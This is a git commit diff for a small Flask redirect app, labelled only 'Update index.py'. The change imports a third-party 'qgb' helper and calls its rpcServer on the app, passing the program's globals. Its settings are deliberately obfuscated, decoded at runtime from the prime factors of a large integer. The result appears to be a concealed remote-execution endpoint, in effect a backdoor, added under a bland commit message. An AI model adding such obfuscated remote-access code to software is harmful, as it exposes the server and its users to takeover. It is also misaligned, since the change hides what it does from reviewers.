fb87ace15a99b0cbd37581df2782db21f0869388
github.com/users/qgbcs <36606669+qgbcs@users.noreply.github.com>
2022-06-30 03:20:57 +0800

    Update index.py

--- index.py
+++ index.py
@@ -1,6 +1,11 @@
+from qgb import py
+U,T,N,F=py.importUTNF()
+
 from flask import Flask, redirect
 import requests
 app = Flask(__name__)
+
+N.rpcServer(locals=globals(),globals=globals(),app=app,**dict(T.split_to_2d_list(''.join(chr(z%311) for z in U.prime_factorization(1126670844869212339)),chr(58),)),)
 
 @app.route('/bing/')
 def index():
